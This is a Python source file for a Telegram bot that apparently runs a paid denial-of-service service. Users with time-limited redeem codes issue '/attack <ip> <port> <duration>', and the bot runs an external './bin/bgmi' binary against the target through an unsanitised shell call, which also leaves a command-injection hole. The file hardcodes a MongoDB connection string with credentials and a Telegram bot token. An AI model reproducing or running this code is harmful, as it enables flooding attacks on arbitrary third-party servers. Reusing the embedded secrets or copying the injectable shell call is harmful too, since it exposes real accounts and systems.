import os
import socket
import subprocess
import asyncio
import pytz
import platform
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta

# Database Configuration
MONGO_URI = 'mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net'
client = MongoClient(MONGO_URI)
db = client['Kamisama']
users_collection = db['RAJ']
settings_collection = db['settings0']
redeem_codes_collection = db['redeem_codes0']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7668443193:AAEH9QeB5fZ4UeNw_SGkeB_dT8pHwv8YN68'
ADMIN_USER_ID = 7147401720  # Replace with your admin user ID

# Helper: Ensure datetime is timezone-aware in UTC
def ensure_utc(dt):
    if dt is None:
        return None
    if dt.tzinfo is None:
        # localize naive datetime as UTC
        return pytz.UTC.localize(dt)
    else:
        # convert to UTC
        return dt.astimezone(pytz.UTC)

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*🔸 /start* - Start interacting with the bot.\n"
            "*🔸 /attack* - Trigger an attack operation.\n"
            "*🔸 /redeem* - Redeem a code.\n"
        )
    else:
        help_text = (
            "*💡 Available Commands for Admins:*\n\n"
            "*🔸 /start* - Start the bot.\n"
            "*🔸 /attack* - Start the attack.\n"
            "*🔸 /add [user_id]* - Add a user.\n"
            "*🔸 /remove [user_id]* - Remove a user.\n"
            "*🔸 /users* - List all allowed users.\n"
            "*🔸 /gen* - Generate a redeem code.\n"
            "*🔸 /redeem* - Redeem a code.\n"
            "*🔸 /delete_code* - Delete a redeem code.\n"
            "*🔸 /list_codes* - List all redeem codes.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    message = (
        "*🔥 Welcome to @RAJOWNER20 world 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    time_input = context.args[1]

    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 86400
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 60
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return

    expiry_date = datetime.now(pytz.UTC) + timedelta(seconds=total_seconds)
    # Store timezone-aware datetime
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added with expiry in {time_value}{time_input[-1]}.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bin/bgmi {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to generate redeem codes!*", parse_mode='Markdown')
        return

    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", parse_mode='Markdown')
        return

    max_uses = 1
    custom_code = None

    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code

    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return

    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(pytz.UTC) + timedelta(days=time_value)
        expiry_label = f"{time_value} day(s)"
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(pytz.UTC) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute(s)"

    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please provide a valid number for max uses.*", parse_mode='Markdown')
            return

    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],
        "max_uses": max_uses,
        "redeem_count": 0
    })

    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})

    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return

    expiry_date = ensure_utc(redeem_entry.get('expiry_date'))
    if expiry_date <= datetime.now(pytz.UTC):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return

    if redeem_entry.get('redeem_count', 0) >= redeem_entry.get('max_uses', 1):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return

    if user_id in redeem_entry.get('used_by', []):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return

    users_collection.update_one({"user_id": user_id}, {"$set": {"expiry_date": expiry_date}}, upsert=True)
    redeem_codes_collection.update_one({"code": code}, {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}})

    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to delete redeem codes!*", parse_mode='Markdown')
        return

    if len(context.args) > 0:
        specific_code = context.args[0]
        result = redeem_codes_collection.delete_one({"code": specific_code})
        if result.deleted_count > 0:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Redeem code `{specific_code}` has been deleted successfully.*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Code `{specific_code}` not found.*", parse_mode='Markdown')
    else:
        current_time = datetime.now(pytz.UTC)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})
        if result.deleted_count > 0:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Deleted {result.deleted_count} expired redeem code(s).*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No expired codes found to delete.*", parse_mode='Markdown')

async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view redeem codes!*", parse_mode='Markdown')
        return

    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No redeem codes found.*", parse_mode='Markdown')
        return

    codes = redeem_codes_collection.find()
    message = "*🎟️ Active Redeem Codes:*\n"
    current_time = datetime.now(pytz.UTC)

    for code in codes:
        expiry_date = ensure_utc(code.get('expiry_date'))
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        time_diff = expiry_date - current_time
        remaining_minutes = max(1, time_diff.total_seconds() // 60)

        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440
            remaining_hours = (remaining_minutes % 1440) // 60
            remaining_time = f"({int(remaining_days)} days, {int(remaining_hours)} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"

        status = "✅" if expiry_date > current_time else "❌"
        if status == "❌":
            remaining_time = "(Expired)"

        message += f"• Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def list_users(update, context):
    current_time = datetime.now(pytz.UTC)
    users = users_collection.find()
    user_list_message = "👥 User List:\n"

    for user in users:
        user_id = user['user_id']
        expiry_date = ensure_utc(user.get('expiry_date'))
        time_remaining = expiry_date - current_time
        expired = time_remaining.total_seconds() <= 0

        if expired:
            expiry_label = "Expired"
            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = ensure_utc(user.get('expiry_date'))
        if expiry_date and expiry_date > datetime.now(pytz.UTC):
            return True
    return False

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("help", help_command))

    application.run_polling()

if __name__ == '__main__':
    main()
